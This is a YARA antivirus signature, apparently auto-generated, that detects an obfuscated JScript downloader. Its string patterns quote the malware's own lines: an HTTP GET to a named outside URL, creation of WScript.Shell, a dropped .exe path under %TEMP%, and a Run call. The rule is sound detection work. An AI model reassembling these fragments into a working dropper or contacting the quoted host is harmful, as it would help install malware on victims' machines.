rule sig_20160401_cc2cf8c6da482df86ba461fa271b422c {
  meta:
    description = "datamaliciousorder - file 20160401_cc2cf8c6da482df86ba461fa271b422c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d26a94e27fb55d124d6121020022d9acff5f440e9676a9a817347b2f2610de8b"

  strings:
    $s1  = "TmXe[LyNll](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "function CwSy(JeBz, NfLgg){UxBh = UxBh * 1; return JeBz - NfLgg;};" fullword ascii
    $s3  = "var IuTp = function TxoNpa() {return WScript[IgxYhv](\"WScript\"+\".Shell\");}(), LhCe = 11;" fullword ascii
    $s4  = "if (TmXe[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PtYju(){return HsMwr + \"\";};" fullword ascii
    $s6  = "function DmwBk() {return IuTp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"PcC3ZpZF.ex\" + \"e\";};" fullword ascii
    $s7  = "function TpFuc() {return ((HqhKic == true) && (HqhKic == OvrVi)) ? 1 : UxBh;};" fullword ascii
    $s8  = "OvrVi = true; " fullword ascii
    $s9  = "function ObIyy()" fullword ascii
    $s10 = "function XqAo(){return 23;};" fullword ascii
    $s11 = "var HqhKic = false;" fullword ascii
    $s12 = "var OvrVi = false;" fullword ascii
    $s13 = "return CwSy(ZhVh, EmqMg);" fullword ascii
    $s14 = "var RyaBl = new this[\"Date\"]();" fullword ascii
    $s15 = "HqhKic = true; " fullword ascii
    $s16 = "var FqgKuy = false;" fullword ascii
    $s17 = "function MiQsy(LxcHb) {var NaLz = (1, 2, 3, 4, 5, LxcHb); return NaLz;};" fullword ascii
    $s18 = "}while (OrlXz);" fullword ascii
    $s19 = "function UaWla(){return IgxYhv;};" fullword ascii
    $s20 = "function XacXog(LwhJw){IuTp[\"R\"+\"un\"](LwhJw, UxBh, UxBh);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}